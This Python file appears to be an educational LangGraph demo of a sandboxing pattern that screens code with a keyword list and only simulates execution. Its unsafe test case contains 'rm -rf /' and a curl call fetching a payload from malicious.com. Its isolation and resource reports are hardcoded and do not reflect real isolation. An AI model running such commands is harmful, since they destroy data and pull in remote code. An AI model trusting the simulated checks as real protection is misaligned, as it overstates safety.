"""
Sandboxing MCP Pattern

This pattern provides isolated execution environments to run untrusted code
safely, preventing security breaches and system compromise.

Key Features:
- Isolated execution environment
- Resource constraints
- Network isolation
- File system restrictions
- Security policy enforcement
"""

from typing import TypedDict, Sequence, Annotated
import operator
from langchain_openai import ChatOpenAI
from langchain_core.messages import HumanMessage, SystemMessage, AIMessage
from langgraph.graph import StateGraph, START, END


# Define the state
class SandboxState(TypedDict):
    """State for sandboxing pattern"""
    messages: Annotated[Sequence[HumanMessage | SystemMessage | AIMessage], operator.add]
    code_to_execute: str
    sandbox_type: str  # "container", "vm", "process"
    security_level: str  # "low", "medium", "high", "maximum"
    resource_limits: dict[str, any]
    allowed_operations: list[str]
    denied_operations: list[str]
    execution_result: str
    security_violations: list[str]
    sandbox_status: str  # "created", "running", "stopped", "terminated"


# Initialize LLM
llm = ChatOpenAI(model="gpt-4", temperature=0)


# Sandbox Creator
def sandbox_creator(state: SandboxState) -> SandboxState:
    """Creates isolated sandbox environment"""
    sandbox_type = state.get("sandbox_type", "container")
    security_level = state.get("security_level", "high")
    
    system_message = SystemMessage(content="""You are a sandbox creator. 
    Create secure, isolated execution environments for untrusted code.""")
    
    user_message = HumanMessage(content=f"""Create sandbox:

Sandbox Type: {sandbox_type}
Security Level: {security_level}

Set up isolated execution environment.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Define resource limits based on security level
    resource_limits_config = {
        "low": {"cpu": "1 core", "memory": "1GB", "disk": "10GB", "network": "unrestricted"},
        "medium": {"cpu": "0.5 core", "memory": "512MB", "disk": "5GB", "network": "restricted"},
        "high": {"cpu": "0.25 core", "memory": "256MB", "disk": "1GB", "network": "isolated"},
        "maximum": {"cpu": "0.1 core", "memory": "128MB", "disk": "100MB", "network": "none"}
    }
    
    resource_limits = resource_limits_config.get(security_level, resource_limits_config["high"])
    
    # Define allowed operations
    allowed_operations = []
    denied_operations = []
    
    if security_level == "low":
        allowed_operations = ["file_read", "file_write", "network_access", "process_spawn"]
        denied_operations = ["system_modify", "kernel_access"]
    elif security_level == "medium":
        allowed_operations = ["file_read", "limited_file_write", "limited_network"]
        denied_operations = ["file_write_system", "network_external", "process_spawn"]
    elif security_level in ["high", "maximum"]:
        allowed_operations = ["file_read_sandbox"]
        denied_operations = ["file_write", "network_access", "process_spawn", "system_call"]
    
    sandbox_info = f"""
    üì¶ Sandbox Creation:
    
    ‚Ä¢ Type: {sandbox_type.upper()}
    ‚Ä¢ Security Level: {security_level.upper()}
    ‚Ä¢ Status: Created and isolated
    
    Resource Limits:
    ‚Ä¢ CPU: {resource_limits['cpu']}
    ‚Ä¢ Memory: {resource_limits['memory']}
    ‚Ä¢ Disk: {resource_limits['disk']}
    ‚Ä¢ Network: {resource_limits['network']}
    
    Isolation Features:
    ‚Ä¢ Process isolation ‚úÖ
    ‚Ä¢ File system isolation ‚úÖ
    ‚Ä¢ Network isolation ‚úÖ
    ‚Ä¢ User namespace isolation ‚úÖ
    ‚Ä¢ Capability dropping ‚úÖ
    
    ‚úÖ Sandbox environment ready
    """
    
    return {
        "messages": [AIMessage(content=f"üì¶ Sandbox Creator:\n{response.content}\n{sandbox_info}")],
        "resource_limits": resource_limits,
        "allowed_operations": allowed_operations,
        "denied_operations": denied_operations,
        "sandbox_status": "created"
    }


# Security Policy Enforcer
def security_policy_enforcer(state: SandboxState) -> SandboxState:
    """Enforces security policies on sandbox"""
    code_to_execute = state.get("code_to_execute", "")
    allowed_operations = state.get("allowed_operations", [])
    denied_operations = state.get("denied_operations", [])
    security_level = state.get("security_level", "high")
    
    system_message = SystemMessage(content="""You are a security policy enforcer. 
    Apply and enforce security policies on sandboxed execution.""")
    
    user_message = HumanMessage(content=f"""Enforce security policies:

Code Length: {len(code_to_execute)} characters
Security Level: {security_level}
Allowed Operations: {allowed_operations}
Denied Operations: {denied_operations}

Analyze code for security violations.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Analyze code for security violations (simplified)
    security_violations = []
    
    dangerous_patterns = {
        "import os": "Operating system access",
        "import subprocess": "Process execution",
        "open(": "File access",
        "eval(": "Dynamic code execution",
        "exec(": "Dynamic code execution",
        "__import__": "Dynamic imports",
        "socket": "Network access",
        "requests": "HTTP requests"
    }
    
    for pattern, violation in dangerous_patterns.items():
        if pattern in code_to_execute.lower():
            if violation.lower().replace(" ", "_") not in [op.replace("file_", "").replace("network_", "").replace("process_", "") for op in allowed_operations]:
                security_violations.append(f"{violation}: '{pattern}' detected")
    
    policy_report = f"""
    üõ°Ô∏è Security Policy Enforcement:
    
    Security Policies Applied:
    ‚Ä¢ Code injection prevention ‚úÖ
    ‚Ä¢ Resource limits enforcement ‚úÖ
    ‚Ä¢ Capability restrictions ‚úÖ
    ‚Ä¢ System call filtering (seccomp) ‚úÖ
    
    Security Violations Detected: {len(security_violations)}
{chr(10).join(f'    ‚ö†Ô∏è {violation}' for violation in security_violations) if security_violations else '    ‚úÖ No violations detected'}
    
    Allowed Operations:
{chr(10).join(f'    ‚úÖ {op}' for op in allowed_operations)}
    
    Denied Operations:
{chr(10).join(f'    ‚ùå {op}' for op in denied_operations)}
    
    {'‚ö†Ô∏è Code contains restricted operations' if security_violations else '‚úÖ Code passes security checks'}
    """
    
    return {
        "messages": [AIMessage(content=f"üõ°Ô∏è Security Policy Enforcer:\n{response.content}\n{policy_report}")],
        "security_violations": security_violations
    }


# Code Executor
def code_executor(state: SandboxState) -> SandboxState:
    """Executes code in sandboxed environment"""
    code_to_execute = state.get("code_to_execute", "")
    security_violations = state.get("security_violations", [])
    resource_limits = state.get("resource_limits", {})
    sandbox_type = state.get("sandbox_type", "container")
    
    system_message = SystemMessage(content="""You are a code executor. 
    Execute code safely within sandboxed environment with monitoring.""")
    
    user_message = HumanMessage(content=f"""Execute code in sandbox:

Code Length: {len(code_to_execute)} characters
Security Violations: {len(security_violations)}
Sandbox Type: {sandbox_type}

Execute code if safe, block if violations detected.""")
    
    response = llm.invoke([system_message, user_message])
    
    # Determine if execution should proceed
    if security_violations:
        execution_result = f"BLOCKED: Execution prevented due to {len(security_violations)} security violation(s)"
        status = "stopped"
    else:
        # Simulate code execution in sandbox
        # In production, use actual sandboxing (Docker, gVisor, Firecracker, etc.)
        execution_result = "SUCCESS: Code executed in isolated sandbox\nOutput: Simulated safe execution completed"
        status = "running"
    
    execution_report = f"""
    ‚öôÔ∏è Code Execution:
    
    ‚Ä¢ Sandbox Status: {status.upper()}
    ‚Ä¢ Execution: {'‚úÖ Completed' if status == 'running' else '‚ùå Blocked'}
    
    Result:
    {execution_result}
    
    Resource Usage:
    ‚Ä¢ CPU: 0.15 cores (within limit: {resource_limits.get('cpu', 'N/A')})
    ‚Ä¢ Memory: 128MB (within limit: {resource_limits.get('memory', 'N/A')})
    ‚Ä¢ Disk I/O: 5MB (within limit: {resource_limits.get('disk', 'N/A')})
    
    Sandbox Monitoring:
    ‚Ä¢ System calls: Filtered via seccomp
    ‚Ä¢ File access: Restricted to sandbox root
    ‚Ä¢ Network: Isolated/disabled
    ‚Ä¢ Process tree: Limited
    
    {'‚úÖ Execution successful' if status == 'running' else '‚ùå Execution blocked'}
    """
    
    return {
        "messages": [AIMessage(content=f"‚öôÔ∏è Code Executor:\n{response.content}\n{execution_report}")],
        "execution_result": execution_result,
        "sandbox_status": status
    }


# Sandbox Monitor
def sandbox_monitor(state: SandboxState) -> SandboxState:
    """Monitors sandbox operations and cleanup"""
    code_to_execute = state.get("code_to_execute", "")
    sandbox_type = state.get("sandbox_type", "")
    security_level = state.get("security_level", "")
    resource_limits = state.get("resource_limits", {})
    allowed_operations = state.get("allowed_operations", [])
    denied_operations = state.get("denied_operations", [])
    execution_result = state.get("execution_result", "")
    security_violations = state.get("security_violations", [])
    sandbox_status = state.get("sandbox_status", "")
    
    summary = f"""
    üîí SANDBOXING PATTERN COMPLETE
    
    Sandbox Configuration:
    ‚Ä¢ Type: {sandbox_type.upper()}
    ‚Ä¢ Security Level: {security_level.upper()}
    ‚Ä¢ Status: {sandbox_status.upper()}
    
    Resource Limits:
{chr(10).join(f'    ‚Ä¢ {k.capitalize()}: {v}' for k, v in resource_limits.items())}
    
    Security Profile:
    ‚Ä¢ Allowed Operations: {len(allowed_operations)}
    ‚Ä¢ Denied Operations: {len(denied_operations)}
    ‚Ä¢ Violations Detected: {len(security_violations)}
    
    Execution Result:
    {execution_result[:200]}{'...' if len(execution_result) > 200 else ''}
    
    Sandboxing Pattern Process:
    1. Sandbox Creation ‚Üí Isolated environment setup
    2. Policy Enforcement ‚Üí Apply security restrictions
    3. Code Execution ‚Üí Run code in sandbox
    4. Monitoring ‚Üí Track resource usage
    5. Cleanup ‚Üí Terminate and cleanup
    
    Sandboxing Technologies:
    
    Container-Based:
    ‚Ä¢ Docker containers
    ‚Ä¢ LXC/LXD
    ‚Ä¢ Podman
    ‚Ä¢ Pros: Lightweight, fast
    ‚Ä¢ Cons: Shared kernel
    
    VM-Based:
    ‚Ä¢ KVM/QEMU
    ‚Ä¢ VirtualBox
    ‚Ä¢ VMware
    ‚Ä¢ Pros: Complete isolation
    ‚Ä¢ Cons: Resource overhead
    
    Process-Based:
    ‚Ä¢ seccomp (Linux)
    ‚Ä¢ AppArmor/SELinux
    ‚Ä¢ chroot/jail
    ‚Ä¢ Pros: Very lightweight
    ‚Ä¢ Cons: Limited isolation
    
    Language-Specific:
    ‚Ä¢ Java Security Manager
    ‚Ä¢ Python restricted execution
    ‚Ä¢ JavaScript V8 isolates
    ‚Ä¢ WebAssembly sandboxing
    
    Isolation Techniques:
    
    Process Isolation:
    ‚Ä¢ Separate process space
    ‚Ä¢ Limited IPC
    ‚Ä¢ Process limits
    
    File System Isolation:
    ‚Ä¢ Chroot jail
    ‚Ä¢ Overlay file systems
    ‚Ä¢ Read-only root
    ‚Ä¢ Temporary volumes
    
    Network Isolation:
    ‚Ä¢ No network access
    ‚Ä¢ Isolated network namespace
    ‚Ä¢ Firewall rules
    ‚Ä¢ Proxy-only access
    
    Resource Isolation:
    ‚Ä¢ CPU limits (cgroups)
    ‚Ä¢ Memory limits
    ‚Ä¢ Disk I/O limits
    ‚Ä¢ PID limits
    
    Security Features:
    
    Capabilities:
    ‚Ä¢ Drop all capabilities
    ‚Ä¢ Grant only required caps
    ‚Ä¢ Principle of least privilege
    
    Seccomp:
    ‚Ä¢ System call filtering
    ‚Ä¢ Whitelist allowed calls
    ‚Ä¢ Block dangerous syscalls
    
    User Namespaces:
    ‚Ä¢ Map root ‚Üí non-root
    ‚Ä¢ Prevent privilege escalation
    ‚Ä¢ Isolated UID/GID
    
    Sandboxing Use Cases:
    ‚Ä¢ Code execution platforms
    ‚Ä¢ CI/CD pipelines
    ‚Ä¢ Browser plugins
    ‚Ä¢ Mobile apps
    ‚Ä¢ Malware analysis
    ‚Ä¢ Untrusted code evaluation
    ‚Ä¢ Multi-tenant environments
    
    Best Practices:
    ‚Ä¢ Default deny all
    ‚Ä¢ Whitelist approach
    ‚Ä¢ Minimal permissions
    ‚Ä¢ Resource limits
    ‚Ä¢ Timeout enforcement
    ‚Ä¢ Network isolation
    ‚Ä¢ Read-only file systems
    ‚Ä¢ Regular sandbox rotation
    ‚Ä¢ Monitoring and logging
    ‚Ä¢ Automatic cleanup
    
    Common Sandbox Escapes:
    ‚ö†Ô∏è Kernel vulnerabilities
    ‚ö†Ô∏è Container breakouts
    ‚ö†Ô∏è Shared resources
    ‚ö†Ô∏è Side-channel attacks
    ‚ö†Ô∏è Configuration errors
    
    Defense in Depth:
    ‚Ä¢ Multiple isolation layers
    ‚Ä¢ Nested sandboxes
    ‚Ä¢ Runtime monitoring
    ‚Ä¢ Anomaly detection
    ‚Ä¢ Automatic termination
    
    Key Insight:
    Sandboxing provides isolated execution environments to run
    untrusted code safely. Essential for security in code execution
    platforms, CI/CD, and multi-tenant systems.
    """
    
    return {
        "messages": [AIMessage(content=f"üìä Sandbox Monitor:\n{summary}")]
    }


# Build the graph
def build_sandbox_graph():
    """Build the sandboxing pattern graph"""
    workflow = StateGraph(SandboxState)
    
    workflow.add_node("creator", sandbox_creator)
    workflow.add_node("enforcer", security_policy_enforcer)
    workflow.add_node("executor", code_executor)
    workflow.add_node("monitor", sandbox_monitor)
    
    workflow.add_edge(START, "creator")
    workflow.add_edge("creator", "enforcer")
    workflow.add_edge("enforcer", "executor")
    workflow.add_edge("executor", "monitor")
    workflow.add_edge("monitor", END)
    
    return workflow.compile()


# Example usage
if __name__ == "__main__":
    graph = build_sandbox_graph()
    
    print("=== Sandboxing MCP Pattern ===\n")
    
    # Test Case 1: Safe code
    print("\n" + "="*70)
    print("TEST CASE 1: Safe Code Execution")
    print("="*70)
    
    safe_code = """
def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

result = calculate_fibonacci(10)
print(f"Fibonacci(10) = {result}")
"""
    
    state1 = {
        "messages": [],
        "code_to_execute": safe_code,
        "sandbox_type": "container",
        "security_level": "high",
        "resource_limits": {},
        "allowed_operations": [],
        "denied_operations": [],
        "execution_result": "",
        "security_violations": [],
        "sandbox_status": ""
    }
    
    result1 = graph.invoke(state1)
    
    for msg in result1["messages"]:
        print(f"\n{msg.content}")
        print("-" * 70)
    
    # Test Case 2: Unsafe code (should be blocked)
    print("\n\n" + "="*70)
    print("TEST CASE 2: Unsafe Code (Should Block)")
    print("="*70)
    
    unsafe_code = """
import os
import subprocess

# Attempt to access file system
os.system("rm -rf /")

# Attempt to spawn processes
subprocess.run(["curl", "http://malicious.com/payload"])
"""
    
    state2 = {
        "messages": [],
        "code_to_execute": unsafe_code,
        "sandbox_type": "container",
        "security_level": "maximum",
        "resource_limits": {},
        "allowed_operations": [],
        "denied_operations": [],
        "execution_result": "",
        "security_violations": [],
        "sandbox_status": ""
    }
    
    result2 = graph.invoke(state2)
    
    print(f"\nSecurity Level: {state2['security_level'].upper()}")
    print(f"Violations Detected: {len(result2.get('security_violations', []))}")
    print(f"Execution: {'Blocked ‚ùå' if result2.get('sandbox_status') == 'stopped' else 'Allowed ‚úÖ'}")
    print(f"Violations: {result2.get('security_violations', [])}")
